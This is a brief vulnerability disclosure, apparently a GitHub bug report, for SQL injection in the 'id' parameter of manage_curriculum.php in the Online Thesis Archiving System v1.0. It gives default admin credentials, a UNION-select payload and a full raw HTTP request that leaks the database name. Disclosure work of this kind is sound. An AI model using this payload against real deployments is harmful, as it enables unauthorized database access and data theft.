# Online Thesis Archiving System v1.0 by sourcecodester has SQL injection 5

BUG_Author: huliangjia

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /otas/admin/curriculum/manage_curriculum.php

Vulnerability location: /otas/admin/curriculum/manage_curriculum.php?id=, id

dbname = otas_db

[+] Payload: /otas/admin/curriculum/manage_curriculum.php?id=0%27%20union%20select%201,2,database(),4,5,6,7--+ // Leak place ---> id

```sql
GET /otas/admin/curriculum/manage_curriculum.php?id=0%27%20union%20select%201,2,database(),4,5,6,7--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rpf8v4l0kpm50v3jmb8tlle30e
Connection: close


```

<img width="1133" height="527" alt="image" src="https://github.com/user-attachments/assets/932ded4d-7148-4fd5-902d-5bf68aac9a11" />
